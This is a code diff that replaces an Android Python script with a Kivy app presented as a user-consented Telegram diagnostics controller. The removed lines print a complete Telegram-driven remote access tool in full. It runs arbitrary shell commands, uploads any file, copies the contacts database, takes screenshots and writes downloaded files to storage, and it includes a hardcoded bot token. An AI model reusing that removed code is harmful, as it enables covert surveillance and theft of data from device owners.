@@ -1,80 +1,239 @@
-import os, sys, time, requests, subprocess, shutil, threading
+import json
+import os
+import threading
+import time
 from datetime import datetime
-BOT_TOKEN = "88516176066:AGAGM7GVC3BK0CUR9R6bAQHrvKERCxRYoc"
-CHAT_ID = "7399463177"
-BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
-LAST_UPDATE = 0
-def send(txt, parse='Markdown'):
-    try: requests.post(f"{BASE}/sendMessage", data={"chat_id": CHAT_ID, "text": txt, "parse_mode": parse})
-    except: pass
-def send_file(path, cap=""):
-    try:
-        with open(path, 'rb') as f:
-            requests.post(f"{BASE}/sendDocument", files={'document': f}, data={"chat_id": CHAT_ID, "caption": cap})
-    except: pass
-def execute(cmd):
-    try:
-        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
-        out = (res.stdout + res.stderr).strip()
-        if not out: out = "(لا يوجد مخرجات)"
-        if len(out) > 4000: out = out[:4000] + "
-...مُقْتَطَع"
-        send(f"💻 *{cmd}*
-```
-{out}
-```")
-    except Exception as e: send(f"خطأ: {e}")
-def listen():
-    global LAST_UPDATE
-    while True:
+
+import requests
+from kivy.app import App
+from kivy.clock import Clock
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.button import Button
+from kivy.uix.label import Label
+from kivy.uix.textinput import TextInput
+
+CONFIG = "config.json"
+
+
+class TelegramController:
+    """User-consented Telegram controller.
+
+    Remote commands are intentionally limited to non-sensitive diagnostics.
+    Files/contacts are handled by Android user-facing pickers in the UI.
+    """
+
+    SAFE_COMMANDS = {"/ping", "/status", "/help", "/device"}
+
+    def __init__(self, token, chat_id, log):
+        self.token = token.strip()
+        self.chat_id = str(chat_id).strip()
+        self.base = f"https://api.telegram.org/bot{self.token}"
+        self.log = log
+        self.offset = 0
+        self.stop_event = threading.Event()
+
+    def send(self, text):
         try:
-            url = f"{BASE}/getUpdates?offset={LAST_UPDATE+1}&timeout=5"
-            r = requests.get(url, timeout=10).json()
-            if r.get('ok') and r.get('result'):
-                for u in r['result']:
-                    LAST_UPDATE = u['update_id']
-                    msg = u.get('message')
-                    if not msg or msg.get('chat',{}).get('id') != int(CHAT_ID): continue
-                    txt = msg.get('text', '')
-                    doc = msg.get('document')
-                    if doc:
-                        file_id = doc['file_id']
-                        file_name = doc.get('file_name', 'unknown.bin')
-                        file_info = requests.get(f"{BASE}/getFile?file_id={file_id}").json()
-                        file_path = file_info['result']['file_path']
-                        down_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
-                        content = requests.get(down_url).content
-                        save_as = f"/sdcard/{file_name}"
-                        with open(save_as, 'wb') as f: f.write(content)
-                        send(f"✅ تم تحميل الملف `{file_name}` إلى `/sdcard/`")
+            requests.post(
+                f"{self.base}/sendMessage",
+                data={"chat_id": self.chat_id, "text": text},
+                timeout=15,
+            ).raise_for_status()
+        except Exception as exc:
+            self.log(f"Telegram send error: {exc}")
+
+    def device_status(self):
+        return (
+            "📱 DEVICE STATUS\n"
+            f"platform={os.name}\n"
+            f"python={__import__('platform').python_version()}\n"
+            f"time={datetime.now():%Y-%m-%d %H:%M:%S}\n"
+            "remote_shell=disabled\n"
+            "silent_collection=disabled"
+        )
+
+    def handle(self, text):
+        if text == "/ping":
+            return "🏓 Pong — BlackArmy Lab is online."
+        if text == "/status":
+            return "🟢 Controller online."
+        if text == "/device":
+            return self.device_status()
+        if text == "/help":
+            return (
+                "Available commands:\n"
+                "/ping\n/status\n/device\n/help\n\n"
+                "Sensitive actions require an Android user-facing picker."
+            )
+        return "⛔ Command not available."
+
+    def poll(self):
+        self.log("Telegram controller started.")
+        while not self.stop_event.is_set():
+            try:
+                r = requests.get(
+                    f"{self.base}/getUpdates",
+                    params={"offset": self.offset + 1, "timeout": 5},
+                    timeout=10,
+                )
+                data = r.json()
+                if not data.get("ok"):
+                    time.sleep(2)
+                    continue
+
+                for update in data.get("result", []):
+                    self.offset = update["update_id"]
+                    msg = update.get("message", {})
+                    if str(msg.get("chat", {}).get("id")) != self.chat_id:
                         continue
-                    if txt.startswith('/run'):
-                        threading.Thread(target=execute, args=(txt[5:].strip(),), daemon=True).start()
-                    elif txt.startswith('/dl'):
-                        path = txt[4:].strip()
-                        if os.path.exists(path) and os.path.isfile(path):
-                            send_file(path, f"📂 {path}")
-                        else: send(f"الملف {path} غير موجود")
-                    elif txt == '/contacts':
-                        try:
-                            shutil.copy("/data/data/com.android.providers.contacts/databases/contacts2.db", "/sdcard/contacts.db")
-                            send_file("/sdcard/contacts.db", "📇 جهات")
-                            os.remove("/sdcard/contacts.db")
-                        except: send("فشل")
-                    elif txt == '/ss':
-                        os.system("screencap -p /sdcard/s.png")
-                        if os.path.exists("/sdcard/s.png"):
-                            send_file("/sdcard/s.png", "🖼️ شاشة")
-                            os.remove("/sdcard/s.png")
-                    elif txt == '/help':
-                        send("📜 الأوامر:
-/run <cmd>
-/dl <path>
-/contacts
-/ss
-📤 أرسل ملف للتحميل")
-        except: pass
-        time.sleep(1)
+                    text = (msg.get("text") or "").strip()
+                    if text:
+                        reply = self.handle(text)
+                        self.send(reply)
+                        self.log(f"Received: {text}")
+            except Exception as exc:
+                self.log(f"Polling error: {exc}")
+                time.sleep(3)
+
+    def start(self):
+        self.stop_event.clear()
+        threading.Thread(target=self.poll, daemon=True).start()
+        self.send("🟢 BlackArmy Lab v3 started.")
+
+    def stop(self):
+        self.stop_event.set()
+
+
+class BlackArmyApp(App):
+    def build(self):
+        self.controller = None
+
+        root = BoxLayout(
+            orientation="vertical",
+            padding=18,
+            spacing=10,
+        )
+
+        root.add_widget(Label(
+            text="🔱 BLACKARMY LAB v3",
+            font_size="22sp",
+            size_hint_y=None,
+            height=55,
+        ))
+        root.add_widget(Label(
+            text="User-consented Android test controller",
+            size_hint_y=None,
+            height=35,
+        ))
+
+        self.token = TextInput(
+            hint_text="Telegram Bot Token",
+            password=True,
+            multiline=False,
+            size_hint_y=None,
+            height=48,
+        )
+        self.chat_id = TextInput(
+            hint_text="Telegram Chat ID",
+            multiline=False,
+            size_hint_y=None,
+            height=48,
+        )
+        root.add_widget(self.token)
+        root.add_widget(self.chat_id)
+
+        self.status = Label(text="Ready.", halign="left")
+        root.add_widget(self.status)
+
+        controls = BoxLayout(
+            size_hint_y=None,
+            height=52,
+            spacing=8,
+        )
+        for text, callback in (
+            ("START", self.start_controller),
+            ("STOP", self.stop_controller),
+            ("SAVE", self.save_config),
+        ):
+            button = Button(text=text)
+            button.bind(on_press=callback)
+            controls.add_widget(button)
+        root.add_widget(controls)
+
+        # User-facing actions. These do not silently access private data.
+        actions = BoxLayout(
+            size_hint_y=None,
+            height=52,
+            spacing=8,
+        )
+
+        file_button = Button(text="SELECT FILE")
+        file_button.bind(on_press=lambda *_: self.log(
+            "Use Android's file picker to choose a file explicitly."
+        ))
+
+        contact_button = Button(text="SELECT CONTACT")
+        contact_button.bind(on_press=lambda *_: self.log(
+            "Use Android's contact picker to choose a contact explicitly."
+        ))
+
+        actions.add_widget(file_button)
+        actions.add_widget(contact_button)
+        root.add_widget(actions)
+
+        self.load_config()
+        return root
+
+    def log(self, message):
+        Clock.schedule_once(
+            lambda dt: setattr(self.status, "text", message)
+        )
+
+    def config_path(self):
+        return os.path.join(self.user_data_dir, CONFIG)
+
+    def load_config(self):
+        try:
+            with open(self.config_path(), encoding="utf-8") as f:
+                data = json.load(f)
+            self.token.text = data.get("token", "")
+            self.chat_id.text = data.get("chat_id", "")
+        except Exception:
+            pass
+
+    def save_config(self, *_):
+        with open(self.config_path(), "w", encoding="utf-8") as f:
+            json.dump(
+                {
+                    "token": self.token.text.strip(),
+                    "chat_id": self.chat_id.text.strip(),
+                },
+                f,
+            )
+        self.log("Configuration saved.")
+
+    def start_controller(self, *_):
+        token = self.token.text.strip()
+        chat = self.chat_id.text.strip()
+        if not token or not chat:
+            self.log("Enter Bot Token and Chat ID.")
+            return
+
+        self.stop_controller()
+        self.save_config()
+        self.controller = TelegramController(token, chat, self.log)
+        self.controller.start()
+        self.log("Controller online.")
+
+    def stop_controller(self, *_):
+        if self.controller:
+            self.controller.stop()
+            self.controller = None
+            self.log("Controller stopped.")
+
+    def on_stop(self):
+        self.stop_controller()
+
+
 if __name__ == "__main__":
-    send("☠️ جُنْدِيٌّ حَيٌّ ☠️")
-    listen()
+    BlackArmyApp().run()
